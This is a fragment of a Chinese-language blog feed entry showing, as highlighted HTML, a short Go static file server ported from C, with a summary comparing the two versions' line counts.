class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;122&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;package&lt;/span&gt; main&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;fmt&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;io/ioutil&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;log&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;net/http&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;os&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;os/exec&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;path/filepath&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;strings&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; realPath &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;//当前程序运行目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;www路由，请求处理 w:response  r:request&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;staticResource&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(w http.ResponseWriter, r *http.Request)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fmt.Println(&lt;span class=&quot;string&quot;&gt;&quot;url:&quot;&lt;/span&gt; + r.RequestURI)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; r.Method == &lt;span class=&quot;string&quot;&gt;&quot;get&quot;&lt;/span&gt; || r.Method == &lt;span class=&quot;string&quot;&gt;&quot;GET&quot;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		disposeGet(w, r)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; r.Method == &lt;span class=&quot;string&quot;&gt;&quot;post&quot;&lt;/span&gt; || r.Method == &lt;span class=&quot;string&quot;&gt;&quot;POST&quot;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		disposePost(w, r)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.WriteHeader(&lt;span class=&quot;number&quot;&gt;501&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Write([]&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;HTML&amp;gt;&amp;lt;HEAD&amp;gt;&amp;lt;TITLE&amp;gt;Method Not Implemented&amp;lt;/TITLE&amp;gt;&amp;lt;/HEAD&amp;gt;&amp;lt;BODY&amp;gt;&amp;lt;P&amp;gt;HTTP request method not supported.&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;取字串 s:字符串 l:取到多少位&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(s &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;, l &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;)&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;string&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(s) &amp;lt;= l &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; s&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ss, sl, rl, rs := &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, []&lt;span class=&quot;keyword&quot;&gt;rune&lt;/span&gt;(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; _, r := &lt;span class=&quot;keyword&quot;&gt;range&lt;/span&gt; rs &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		rint := &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;(r)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; rint &amp;lt; &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			rl = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			rl = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; sl+rl &amp;gt; l &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		sl += rl&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		ss += &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;(r)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ss&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;get获取静态资源 w: response r: request&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;disposeGet&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(w http.ResponseWriter, r *http.Request)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	request_type := r.URL.Path[strings.LastIndex(r.URL.Path, &lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;):]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;switch&lt;/span&gt; request_type &amp;#123; &lt;span class=&quot;comment&quot;&gt;//文件类型判断&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.html&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Header().Set(&lt;span class=&quot;string&quot;&gt;&quot;content-type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;text/html&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.htm&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Header().Set(&lt;span class=&quot;string&quot;&gt;&quot;content-type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;text/html&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.css&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Header().Set(&lt;span class=&quot;string&quot;&gt;&quot;content-type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;text/css&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.js&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Header().Set(&lt;span class=&quot;string&quot;&gt;&quot;content-type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.png&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Header().Set(&lt;span class=&quot;string&quot;&gt;&quot;content-type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;image/png&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.gif&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Header().Set(&lt;span class=&quot;string&quot;&gt;&quot;content-type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;image/gif&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.jpg&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Header().Set(&lt;span class=&quot;string&quot;&gt;&quot;content-type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;image/jpeg&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fin, err := os.Open(realPath + r.URL.Path)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;defer&lt;/span&gt; fin.Close()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;literal&quot;&gt;nil&lt;/span&gt; &amp;#123; &lt;span class=&quot;comment&quot;&gt;//未找到静态资源文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; request_type == &lt;span class=&quot;string&quot;&gt;&quot;.html&quot;&lt;/span&gt; || request_type == &lt;span class=&quot;string&quot;&gt;&quot;.htm&quot;&lt;/span&gt; &amp;#123; &lt;span class=&quot;comment&quot;&gt;//未找到html文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			w.WriteHeader(&lt;span class=&quot;number&quot;&gt;404&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			fmt.Println(&lt;span class=&quot;string&quot;&gt;&quot;static resource:&quot;&lt;/span&gt;, err)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			w.Write([]&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;HTML&amp;gt;&amp;lt;TITLE&amp;gt;Not Found&amp;lt;/TITLE&amp;gt;&amp;lt;BODY&amp;gt;&amp;lt;P&amp;gt;The server could not fulfill.your request be.is unavailable or nonexistent.&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fd, _ := ioutil.ReadAll(fin)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	w.Write(fd)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;post上传静态资源 w: response r: request&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;disposePost&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(w http.ResponseWriter, r *http.Request)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//未实现&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;程序入口&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//获取程序当前路径&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	file, _ := exec.LookPath(os.Args[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	path, _ := filepath.Abs(file)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//命令行参数处理&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	arg_num := &lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(os.Args)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; arg_num == &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		port := os.Args[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;//第一个参数为端口号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		fmt.Println(&lt;span class=&quot;string&quot;&gt;&quot;http server start port:&quot;&lt;/span&gt; + port)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;//取前当前目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		realPath = substr(path, strings.LastIndex(path, &lt;span class=&quot;string&quot;&gt;&quot;\\&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		flag.Parse()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;//请求处理&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		http.HandleFunc(&lt;span class=&quot;string&quot;&gt;&quot;/www/&quot;&lt;/span&gt;, staticResource)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		err := http.ListenAndServe(&lt;span class=&quot;string&quot;&gt;&quot;:&quot;&lt;/span&gt;+port, &lt;span class=&quot;literal&quot;&gt;nil&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;literal&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			log.Fatal(&lt;span class=&quot;string&quot;&gt;&quot;服务器出错:&quot;&lt;/span&gt;, err)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		fmt.Println(&lt;span class=&quot;string&quot;&gt;&quot;参数错误，程序退出&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;周末有人介绍golang很合适后端开发，随即把之前C实现的静态资源下载功能(读取服务器上的静态资源文件内容返回给客户端)改成golang实现。然后对比一下效果。&lt;/p&gt;
&lt;h2 id=&quot;实现对比&quot;&gt;&lt;a href=&quot;#实现对比&quot; class=&quot;headerlink&quot; title=&quot;实现对比&quot;&gt;&lt;/a&gt;实现对比&lt;/h2&gt;&lt;p&gt;同样使用标准库,golang实现代码+注释只需要123行,C实现代码+注释412行，golang代码量只有C的1/3。&lt;/p&gt;
